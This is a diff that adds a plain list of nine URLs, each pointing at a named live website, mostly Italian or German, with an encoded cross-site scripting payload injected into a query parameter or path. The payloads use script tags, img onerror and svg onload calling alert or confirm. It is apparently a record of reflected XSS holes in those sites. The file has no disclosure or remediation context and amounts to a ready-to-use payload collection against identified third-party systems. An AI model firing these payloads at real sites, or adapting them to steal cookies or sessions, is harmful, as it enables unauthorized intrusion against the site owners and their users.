@@ -1,0 +1,9 @@
+http://abae.it/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
+http://affinitive.it/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://affittokinetec.it/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://aricivitavecchia.it/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://ioook.de/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E
+http://ip-109-144-000-128.cpe.my-wire.de?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+https://1.imgr.it/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(xss)%3E
+https://aetisol.erpy.it/main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
+https://agenziaimmobiliarespazio.it/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
